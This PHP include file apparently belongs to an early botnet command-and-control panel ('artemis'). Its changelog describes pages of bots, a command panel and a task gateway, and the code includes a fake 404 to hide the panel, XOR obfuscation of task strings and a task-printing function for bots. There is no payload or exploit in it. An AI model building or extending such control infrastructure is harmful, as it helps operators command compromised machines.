<?php
	$CHANGELOG = "";
	function addChange($addversion, $addtext) {
		global $CHANGELOG;
		$CHANGELOG .= "<b>$addversion</b> ";
		$CHANGELOG .= "$addtext<br>";
	}

	// Vars
	$BOT_KEY = "KEY"; // Use a proper key later
	$newline = "<br/>\n";
	$TIME = strtotime(gmdate('M d Y H:i:s'));

	addChange("b0.0.1", "Wrote a lot of PHP.");
	addChange("b0.0.2", "Added pages to bots so not all 500 will be shown on one page.");
	addChange("b0.0.3", "Fixed changelog and last seen/join dates.");
	addChange("b0.0.4", "Added Command panel. Not fully functional yet.");
	addChange("b0.0.5", "Fixed command table. Added command functionality. Added debug commands.");
	addChange("b0.0.6", "Made gateway check for tasks and insert task logs. Todo: Print task to screen (Make function?) & make a button that checks for logs that are for dead tasks and delete them / check for tasks where the count is = 0 and delete them.");
	addChange("b0.0.7", "Gateway still needs to print but otherwise it cleans itself now.");
	addChange("b0.0.8", "Fixed all the bugs and errors created in 0.0.7.");
	addChange("b0.0.9", "Added command table & command descriptions.");
	addChange("b0.1.0", "Finally a working build. Bug fixes.");
	
	// Inlcudes
	define("_DEBUG", 1);
	define("DEBUG", 1);

	error_reporting(E_ALL);
	ini_set('display_errors', 'On');
	ini_set("log_errors", 1);
	$logFile = "";

	function setLog($dir) {
		global $logFile;
		ini_set("error_log", "/var/log/artemis/" . $dir);
		$logFile = "/var/log/artemis/" . $dir;
	}

	setLog("general.log"); // Set general php log

	function logx($input, $die) {
		global $logFile;
		$date = getdate();


		if (is_array($input) == true)
			$string = implode($input);
		else
			$string = $input;

		$rstring = "[" . $date['mday'] . "-" . $date['month'] . "-" . $date['year'] . " " . $date['hours'] . ":" . $date['minutes'] . ":" . $date['seconds'] . " " . $_SERVER['REMOTE_ADDR'] . "] " . $string . "\n";
		error_log($rstring, 3, $logFile);
		if (defined("DEBUG"))
			echo $rstring . "<br>";
		if ($die)
			die();
	}

	function isInt($input) { // Credits: http://php.net/manual/en/function.is-int.php#82857
		return(ctype_digit(strval($input)));
	}

	function generateRandomString($length = 10) {
		$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
		$charactersLength = strlen($characters);
		$randomString = '';
		for($i = 0; $i < $length; $i++)
		{
			$randomString .= $characters[rand(0, $charactersLength - 1)];
		}
		return $randomString;
	}
	
	function fake404() {
		http_response_code(404);
		exit;
		// I should brobably make it read the 404 page but this is an alpha so
	}

	function htmlsc($string) {
		return htmlspecialchars($string, ENT_QUOTES, "UTF-8");
	}
	
	function xorCrypt($string) {
		$key = ("secret");
		$text = $string;
		$outText = '';

		for($i = 0; $i < strlen($text);) {
			for($j = 0; ($j < strlen($key) && $i < strlen($text)); $j++, $i++) {
				$outText .= $text{$i} ^ $key{$j};
				//echo 'i=' . $i . ', ' . 'j=' . $j . ', ' . $outText{$i} . '<br />'; // For debugging
			}
		}
		return $outText;
	}
	
	function printTask($task, $params) {
		echo "*$task|$params"; // Obfuscate using xor?
		// return;
	}

	// DB info
	$DB_HOST = base64_decode("");
	$DB_NAME = base64_decode("");
	$DB_USER = base64_decode("");
	$DB_PASS = base64_decode("");

	// DB connection and checking
	try {
		$conn = new PDO("mysql:host=$DB_HOST;dbname=$DB_NAME", $DB_USER, $DB_PASS);
		$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); // maybe remove l8r
	} catch (PDOException $e) {
		logx("Failed to connect to DB" . $e->getMessage(), 1);
	}
?>
